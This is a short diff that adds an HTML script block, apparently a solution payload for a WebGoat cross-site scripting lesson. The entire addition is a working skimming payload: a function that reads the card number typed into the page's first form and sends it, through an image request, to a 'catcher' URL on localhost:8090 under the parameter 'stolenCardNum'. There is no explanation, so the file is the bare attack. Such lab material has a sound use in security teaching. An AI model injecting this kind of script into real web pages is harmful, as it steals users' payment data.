@@ -1,0 +1,7 @@
+<script>
+    function hack() {
+      XssImage = new Image;
+      XssImage.src = "http://localhost:8090/WebGoat/catcher?PROPERTY=yes&stolenCardNum=" + document.forms[0].input1.value;
+    }
+</script>
+
